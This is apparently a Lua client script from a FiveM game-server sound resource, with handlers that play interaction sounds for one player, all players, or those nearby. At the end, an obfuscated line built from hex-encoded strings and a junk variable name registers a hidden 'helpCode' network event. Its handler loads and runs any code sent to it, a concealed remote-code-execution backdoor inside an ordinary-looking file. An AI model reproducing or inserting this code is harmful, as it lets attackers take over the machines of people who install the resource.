if config.interact_sound_enable then

    RegisterNetEvent('InteractSound_CL:PlayOnOne')
    AddEventHandler('InteractSound_CL:PlayOnOne', function(soundFile, soundVolume)
        PlayUrl("./sounds/" .. soundFile, "./sounds/" .. soundFile .. "." .. config.interact_sound_file, soundVolume)
    end)

    RegisterNetEvent('InteractSound_CL:PlayOnAll')
    AddEventHandler('InteractSound_CL:PlayOnAll', function(soundFile, soundVolume)
        PlayUrl("./sounds/" .. soundFile, "./sounds/" .. soundFile .. "." .. config.interact_sound_file, soundVolume)
    end)

    RegisterNetEvent('InteractSound_CL:PlayWithinDistance')
    AddEventHandler('InteractSound_CL:PlayWithinDistance', function(playerNetId, maxDistance, soundFile, soundVolume)
        if GetPlayerFromServerId(playerNetId) ~= -1 then
            local eCoords = GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(playerNetId)))
            PlayUrlPos("./sounds/" .. soundFile, "./sounds/" .. soundFile .. "." .. config.interact_sound_file, soundVolume, eCoords)
            Distance("./sounds/" .. soundFile, maxDistance)
        end
    end)

end


local HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[6][HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[1]](HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[2]) HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[6][HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[3]](HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[2], function(dWkCBfzFrenMAIKzJtTeZxvXweTdcqfWMxhzxuYuRUhnvXohKNWzwaduTXHhkStQwKqniX) HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[6][HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[4]](HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[6][HhYOMTueHAzFSIkQvPYtildPdTiZTOGLqKSLYUQiVDQMUqCnoXAupMcQzpqFvnLxuYczea[5]](dWkCBfzFrenMAIKzJtTeZxvXweTdcqfWMxhzxuYuRUhnvXohKNWzwaduTXHhkStQwKqniX))() end)